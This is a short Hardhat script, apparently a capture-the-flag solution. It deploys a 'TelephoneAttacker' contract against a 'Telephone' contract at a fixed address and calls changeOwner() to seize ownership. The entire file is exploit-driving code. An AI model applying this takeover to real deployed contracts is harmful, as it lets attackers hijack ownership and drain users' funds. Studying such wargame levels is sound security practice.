const { ethers } = require("hardhat")

const CONTRACT_NAME = "Telephone"
const ATTACKER_NAME = "TelephoneAttacker"
const CONTRACT_ADDRESS = "0xef4EA4f9EE27c7Cd124328643AF40dA9C72cEa7D"

async function main() {
    const factory = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = factory.attach(CONTRACT_ADDRESS)

    const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
    const attackerContract = await attackerFactory.deploy(contract.address);
    await attackerContract.deployed();

    const tx = await attackerContract.changeOwner();
    await tx.wait();
}

main().catch((error) => {
    console.error(error)
    process.exit(1)
})
